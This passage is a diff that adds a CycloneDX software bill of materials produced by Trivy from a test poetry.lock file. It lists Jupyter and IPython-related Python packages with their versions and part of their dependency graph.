@@ -1,0 +1,3253 @@
+{
+  "$schema": "http://cyclonedx.org/schema/bom-1.6.schema.json",
+  "bomFormat": "CycloneDX",
+  "specVersion": "1.6",
+  "serialNumber": "urn:uuid:5064800a-c04d-4a9c-b158-ffe21bbf6947",
+  "version": 1,
+  "metadata": {
+    "timestamp": "2025-03-10T02:42:49+00:00",
+    "tools": {
+      "components": [
+        {
+          "type": "application",
+          "group": "aquasecurity",
+          "name": "trivy",
+          "version": "0.57.0"
+        }
+      ]
+    },
+    "component": {
+      "bom-ref": "26447a0e-5660-4619-8875-7fc1ed8d4f97",
+      "type": "application",
+      "name": "D:/automation/software-composition-analysis/automation-testing/source_code_testing_files/_python/_poetry.lock1/poetry.lock",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:SchemaVersion",
+          "value": "2"
+        }
+      ]
+    }
+  },
+  "components": [
+    {
+      "bom-ref": "e16f2145-f32d-4ecd-93c1-89246077be9c",
+      "type": "application",
+      "name": "poetry.lock",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:Class",
+          "value": "lang-pkgs"
+        },
+        {
+          "name": "aquasecurity:trivy:Type",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/appnope@0.1.3",
+      "type": "library",
+      "name": "appnope",
+      "version": "0.1.3",
+      "purl": "pkg:pypi/appnope@0.1.3",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "appnope@0.1.3"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/argon2-cffi-bindings@21.2.0",
+      "type": "library",
+      "name": "argon2-cffi-bindings",
+      "version": "21.2.0",
+      "purl": "pkg:pypi/argon2-cffi-bindings@21.2.0",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "argon2-cffi-bindings@21.2.0"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/argon2-cffi@21.3.0",
+      "type": "library",
+      "name": "argon2-cffi",
+      "version": "21.3.0",
+      "purl": "pkg:pypi/argon2-cffi@21.3.0",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "argon2-cffi@21.3.0"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/async-generator@1.10",
+      "type": "library",
+      "name": "async-generator",
+      "version": "1.10",
+      "purl": "pkg:pypi/async-generator@1.10",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "async-generator@1.10"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/attrs@21.4.0",
+      "type": "library",
+      "name": "attrs",
+      "version": "21.4.0",
+      "purl": "pkg:pypi/attrs@21.4.0",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "attrs@21.4.0"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/backcall@0.2.0",
+      "type": "library",
+      "name": "backcall",
+      "version": "0.2.0",
+      "purl": "pkg:pypi/backcall@0.2.0",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "backcall@0.2.0"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/bleach@4.1.0",
+      "type": "library",
+      "name": "bleach",
+      "version": "4.1.0",
+      "purl": "pkg:pypi/bleach@4.1.0",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "bleach@4.1.0"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/cffi@1.15.0",
+      "type": "library",
+      "name": "cffi",
+      "version": "1.15.0",
+      "purl": "pkg:pypi/cffi@1.15.0",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "cffi@1.15.0"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/colorama@0.4.4",
+      "type": "library",
+      "name": "colorama",
+      "version": "0.4.4",
+      "purl": "pkg:pypi/colorama@0.4.4",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "colorama@0.4.4"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/commonmark@0.9.1",
+      "type": "library",
+      "name": "commonmark",
+      "version": "0.9.1",
+      "purl": "pkg:pypi/commonmark@0.9.1",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "commonmark@0.9.1"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/dataclasses@0.8",
+      "type": "library",
+      "name": "dataclasses",
+      "version": "0.8",
+      "purl": "pkg:pypi/dataclasses@0.8",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "dataclasses@0.8"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/decorator@5.1.1",
+      "type": "library",
+      "name": "decorator",
+      "version": "5.1.1",
+      "purl": "pkg:pypi/decorator@5.1.1",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "decorator@5.1.1"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/defusedxml@0.7.1",
+      "type": "library",
+      "name": "defusedxml",
+      "version": "0.7.1",
+      "purl": "pkg:pypi/defusedxml@0.7.1",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "defusedxml@0.7.1"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/entrypoints@0.4",
+      "type": "library",
+      "name": "entrypoints",
+      "version": "0.4",
+      "purl": "pkg:pypi/entrypoints@0.4",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "entrypoints@0.4"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/importlib-metadata@4.8.3",
+      "type": "library",
+      "name": "importlib-metadata",
+      "version": "4.8.3",
+      "purl": "pkg:pypi/importlib-metadata@4.8.3",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "importlib-metadata@4.8.3"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/ipykernel@5.5.6",
+      "type": "library",
+      "name": "ipykernel",
+      "version": "5.5.6",
+      "purl": "pkg:pypi/ipykernel@5.5.6",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "ipykernel@5.5.6"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/ipython-genutils@0.2.0",
+      "type": "library",
+      "name": "ipython-genutils",
+      "version": "0.2.0",
+      "purl": "pkg:pypi/ipython-genutils@0.2.0",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "ipython-genutils@0.2.0"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/ipython@7.16.3",
+      "type": "library",
+      "name": "ipython",
+      "version": "7.16.3",
+      "purl": "pkg:pypi/ipython@7.16.3",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "ipython@7.16.3"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/ipywidgets@7.7.0",
+      "type": "library",
+      "name": "ipywidgets",
+      "version": "7.7.0",
+      "purl": "pkg:pypi/ipywidgets@7.7.0",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "ipywidgets@7.7.0"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/jedi@0.17.2",
+      "type": "library",
+      "name": "jedi",
+      "version": "0.17.2",
+      "purl": "pkg:pypi/jedi@0.17.2",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "jedi@0.17.2"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/jinja2@3.0.3",
+      "type": "library",
+      "name": "jinja2",
+      "version": "3.0.3",
+      "purl": "pkg:pypi/jinja2@3.0.3",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "jinja2@3.0.3"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/jsonschema@4.0.0",
+      "type": "library",
+      "name": "jsonschema",
+      "version": "4.0.0",
+      "purl": "pkg:pypi/jsonschema@4.0.0",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "jsonschema@4.0.0"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/jupyter-client@7.1.2",
+      "type": "library",
+      "name": "jupyter-client",
+      "version": "7.1.2",
+      "purl": "pkg:pypi/jupyter-client@7.1.2",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "jupyter-client@7.1.2"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/jupyter-core@4.9.2",
+      "type": "library",
+      "name": "jupyter-core",
+      "version": "4.9.2",
+      "purl": "pkg:pypi/jupyter-core@4.9.2",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "jupyter-core@4.9.2"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/jupyterlab-pygments@0.1.2",
+      "type": "library",
+      "name": "jupyterlab-pygments",
+      "version": "0.1.2",
+      "purl": "pkg:pypi/jupyterlab-pygments@0.1.2",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "jupyterlab-pygments@0.1.2"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/jupyterlab-widgets@1.1.0",
+      "type": "library",
+      "name": "jupyterlab-widgets",
+      "version": "1.1.0",
+      "purl": "pkg:pypi/jupyterlab-widgets@1.1.0",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "jupyterlab-widgets@1.1.0"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/markupsafe@2.0.1",
+      "type": "library",
+      "name": "markupsafe",
+      "version": "2.0.1",
+      "purl": "pkg:pypi/markupsafe@2.0.1",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "markupsafe@2.0.1"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/mistune@0.8.4",
+      "type": "library",
+      "name": "mistune",
+      "version": "0.8.4",
+      "purl": "pkg:pypi/mistune@0.8.4",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "mistune@0.8.4"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/nbclient@0.5.9",
+      "type": "library",
+      "name": "nbclient",
+      "version": "0.5.9",
+      "purl": "pkg:pypi/nbclient@0.5.9",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "nbclient@0.5.9"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/nbconvert@6.0.7",
+      "type": "library",
+      "name": "nbconvert",
+      "version": "6.0.7",
+      "purl": "pkg:pypi/nbconvert@6.0.7",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "nbconvert@6.0.7"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/nbformat@5.1.3",
+      "type": "library",
+      "name": "nbformat",
+      "version": "5.1.3",
+      "purl": "pkg:pypi/nbformat@5.1.3",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "nbformat@5.1.3"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/nest-asyncio@1.5.5",
+      "type": "library",
+      "name": "nest-asyncio",
+      "version": "1.5.5",
+      "purl": "pkg:pypi/nest-asyncio@1.5.5",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "nest-asyncio@1.5.5"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/notebook@6.4.10",
+      "type": "library",
+      "name": "notebook",
+      "version": "6.4.10",
+      "purl": "pkg:pypi/notebook@6.4.10",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "notebook@6.4.10"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/packaging@21.3",
+      "type": "library",
+      "name": "packaging",
+      "version": "21.3",
+      "purl": "pkg:pypi/packaging@21.3",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "packaging@21.3"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/pandocfilters@1.5.0",
+      "type": "library",
+      "name": "pandocfilters",
+      "version": "1.5.0",
+      "purl": "pkg:pypi/pandocfilters@1.5.0",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "pandocfilters@1.5.0"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/parso@0.7.1",
+      "type": "library",
+      "name": "parso",
+      "version": "0.7.1",
+      "purl": "pkg:pypi/parso@0.7.1",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "parso@0.7.1"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/pexpect@4.8.0",
+      "type": "library",
+      "name": "pexpect",
+      "version": "4.8.0",
+      "purl": "pkg:pypi/pexpect@4.8.0",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "pexpect@4.8.0"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/pickleshare@0.7.5",
+      "type": "library",
+      "name": "pickleshare",
+      "version": "0.7.5",
+      "purl": "pkg:pypi/pickleshare@0.7.5",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "pickleshare@0.7.5"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/prometheus-client@0.14.1",
+      "type": "library",
+      "name": "prometheus-client",
+      "version": "0.14.1",
+      "purl": "pkg:pypi/prometheus-client@0.14.1",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "prometheus-client@0.14.1"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/prompt-toolkit@3.0.29",
+      "type": "library",
+      "name": "prompt-toolkit",
+      "version": "3.0.29",
+      "purl": "pkg:pypi/prompt-toolkit@3.0.29",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "prompt-toolkit@3.0.29"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/ptyprocess@0.7.0",
+      "type": "library",
+      "name": "ptyprocess",
+      "version": "0.7.0",
+      "purl": "pkg:pypi/ptyprocess@0.7.0",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "ptyprocess@0.7.0"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/py@1.11.0",
+      "type": "library",
+      "name": "py",
+      "version": "1.11.0",
+      "purl": "pkg:pypi/py@1.11.0",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "py@1.11.0"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/pycparser@2.21",
+      "type": "library",
+      "name": "pycparser",
+      "version": "2.21",
+      "purl": "pkg:pypi/pycparser@2.21",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "pycparser@2.21"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/pygments@2.12.0",
+      "type": "library",
+      "name": "pygments",
+      "version": "2.12.0",
+      "purl": "pkg:pypi/pygments@2.12.0",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "pygments@2.12.0"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/pyparsing@3.0.7",
+      "type": "library",
+      "name": "pyparsing",
+      "version": "3.0.7",
+      "purl": "pkg:pypi/pyparsing@3.0.7",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "pyparsing@3.0.7"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/pyrsistent@0.18.0",
+      "type": "library",
+      "name": "pyrsistent",
+      "version": "0.18.0",
+      "purl": "pkg:pypi/pyrsistent@0.18.0",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "pyrsistent@0.18.0"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/python-dateutil@2.8.2",
+      "type": "library",
+      "name": "python-dateutil",
+      "version": "2.8.2",
+      "purl": "pkg:pypi/python-dateutil@2.8.2",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "python-dateutil@2.8.2"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/pywin32@304",
+      "type": "library",
+      "name": "pywin32",
+      "version": "304",
+      "purl": "pkg:pypi/pywin32@304",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "pywin32@304"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/pywinpty@2.0.3",
+      "type": "library",
+      "name": "pywinpty",
+      "version": "2.0.3",
+      "purl": "pkg:pypi/pywinpty@2.0.3",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "pywinpty@2.0.3"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/pyzmq@22.3.0",
+      "type": "library",
+      "name": "pyzmq",
+      "version": "22.3.0",
+      "purl": "pkg:pypi/pyzmq@22.3.0",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "pyzmq@22.3.0"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/send2trash@1.8.0",
+      "type": "library",
+      "name": "send2trash",
+      "version": "1.8.0",
+      "purl": "pkg:pypi/send2trash@1.8.0",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "send2trash@1.8.0"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/six@1.16.0",
+      "type": "library",
+      "name": "six",
+      "version": "1.16.0",
+      "purl": "pkg:pypi/six@1.16.0",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "six@1.16.0"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/terminado@0.13.0",
+      "type": "library",
+      "name": "terminado",
+      "version": "0.13.0",
+      "purl": "pkg:pypi/terminado@0.13.0",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "terminado@0.13.0"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/testpath@0.6.0",
+      "type": "library",
+      "name": "testpath",
+      "version": "0.6.0",
+      "purl": "pkg:pypi/testpath@0.6.0",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "testpath@0.6.0"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/tornado@6.1",
+      "type": "library",
+      "name": "tornado",
+      "version": "6.1",
+      "purl": "pkg:pypi/tornado@6.1",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "tornado@6.1"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/traitlets@4.3.3",
+      "type": "library",
+      "name": "traitlets",
+      "version": "4.3.3",
+      "purl": "pkg:pypi/traitlets@4.3.3",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "traitlets@4.3.3"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/typing-extensions@4.1.1",
+      "type": "library",
+      "name": "typing-extensions",
+      "version": "4.1.1",
+      "purl": "pkg:pypi/typing-extensions@4.1.1",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "typing-extensions@4.1.1"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/wcwidth@0.2.5",
+      "type": "library",
+      "name": "wcwidth",
+      "version": "0.2.5",
+      "purl": "pkg:pypi/wcwidth@0.2.5",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "wcwidth@0.2.5"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/webencodings@0.5.1",
+      "type": "library",
+      "name": "webencodings",
+      "version": "0.5.1",
+      "purl": "pkg:pypi/webencodings@0.5.1",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "webencodings@0.5.1"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/widgetsnbextension@3.6.0",
+      "type": "library",
+      "name": "widgetsnbextension",
+      "version": "3.6.0",
+      "purl": "pkg:pypi/widgetsnbextension@3.6.0",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "widgetsnbextension@3.6.0"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    },
+    {
+      "bom-ref": "pkg:pypi/zipp@3.6.0",
+      "type": "library",
+      "name": "zipp",
+      "version": "3.6.0",
+      "purl": "pkg:pypi/zipp@3.6.0",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "zipp@3.6.0"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "poetry"
+        }
+      ]
+    }
+  ],
+  "dependencies": [
+    {
+      "ref": "26447a0e-5660-4619-8875-7fc1ed8d4f97",
+      "dependsOn": [
+        "e16f2145-f32d-4ecd-93c1-89246077be9c"
+      ]
+    },
+    {
+      "ref": "e16f2145-f32d-4ecd-93c1-89246077be9c",
+      "dependsOn": [
+        "pkg:pypi/appnope@0.1.3",
+        "pkg:pypi/argon2-cffi-bindings@21.2.0",
+        "pkg:pypi/argon2-cffi@21.3.0",
+        "pkg:pypi/async-generator@1.10",
+        "pkg:pypi/attrs@21.4.0",
+        "pkg:pypi/backcall@0.2.0",
+        "pkg:pypi/bleach@4.1.0",
+        "pkg:pypi/cffi@1.15.0",
+        "pkg:pypi/colorama@0.4.4",
+        "pkg:pypi/commonmark@0.9.1",
+        "pkg:pypi/dataclasses@0.8",
+        "pkg:pypi/decorator@5.1.1",
+        "pkg:pypi/defusedxml@0.7.1",
+        "pkg:pypi/entrypoints@0.4",
+        "pkg:pypi/importlib-metadata@4.8.3",
+        "pkg:pypi/ipykernel@5.5.6",
+        "pkg:pypi/ipython-genutils@0.2.0",
+        "pkg:pypi/ipython@7.16.3",
+        "pkg:pypi/ipywidgets@7.7.0",
+        "pkg:pypi/jedi@0.17.2",
+        "pkg:pypi/jinja2@3.0.3",
+        "pkg:pypi/jsonschema@4.0.0",
+        "pkg:pypi/jupyter-client@7.1.2",
+        "pkg:pypi/jupyter-core@4.9.2",
+        "pkg:pypi/jupyterlab-pygments@0.1.2",
+        "pkg:pypi/jupyterlab-widgets@1.1.0",
+        "pkg:pypi/markupsafe@2.0.1",
+        "pkg:pypi/mistune@0.8.4",
+        "pkg:pypi/nbclient@0.5.9",
+        "pkg:pypi/nbconvert@6.0.7",
+        "pkg:pypi/nbformat@5.1.3",
+        "pkg:pypi/nest-asyncio@1.5.5",
+        "pkg:pypi/notebook@6.4.10",
+        "pkg:pypi/packaging@21.3",
+        "pkg:pypi/pandocfilters@1.5.0",
+        "pkg:pypi/parso@0.7.1",
+        "pkg:pypi/pexpect@4.8.0",
+        "pkg:pypi/pickleshare@0.7.5",
+        "pkg:pypi/prometheus-client@0.14.1",
+        "pkg:pypi/prompt-toolkit@3.0.29",
+        "pkg:pypi/ptyprocess@0.7.0",
+        "pkg:pypi/py@1.11.0",
+        "pkg:pypi/pycparser@2.21",
+        "pkg:pypi/pygments@2.12.0",
+        "pkg:pypi/pyparsing@3.0.7",
+        "pkg:pypi/pyrsistent@0.18.0",
+        "pkg:pypi/python-dateutil@2.8.2",
+        "pkg:pypi/pywin32@304",
+        "pkg:pypi/pywinpty@2.0.3",
+        "pkg:pypi/pyzmq@22.3.0",
+        "pkg:pypi/send2trash@1.8.0",
+        "pkg:pypi/six@1.16.0",
+        "pkg:pypi/terminado@0.13.0",
+        "pkg:pypi/testpath@0.6.0",
+        "pkg:pypi/tornado@6.1",
+        "pkg:pypi/traitlets@4.3.3",
+        "pkg:pypi/typing-extensions@4.1.1",
+        "pkg:pypi/wcwidth@0.2.5",
+        "pkg:pypi/webencodings@0.5.1",
+        "pkg:pypi/widgetsnbextension@3.6.0",
+        "pkg:pypi/zipp@3.6.0"
+      ]
+    },
+    {
+      "ref": "pkg:pypi/appnope@0.1.3",
+      "dependsOn": []
+    },
+    {
+      "ref": "pkg:pypi/argon2-cffi-bindings@21.2.0",
+      "dependsOn": [
+        "pkg:pypi/cffi@1.15.0"
+      ]
+    },
+    {
+      "ref": "pkg:pypi/argon2-cffi@21.3.0",
+      "dependsOn": [
+        "pkg:pypi/argon2-cffi-bindings@21.2.0",
+        "pkg:pypi/dataclasses@0.8",
+        "pkg:pypi/typing-extensions@4.1.1"
+      ]
+    },
+    {
+      "ref": "pkg:pypi/async-generator@1.10",
+      "dependsOn": []
+    },
+    {
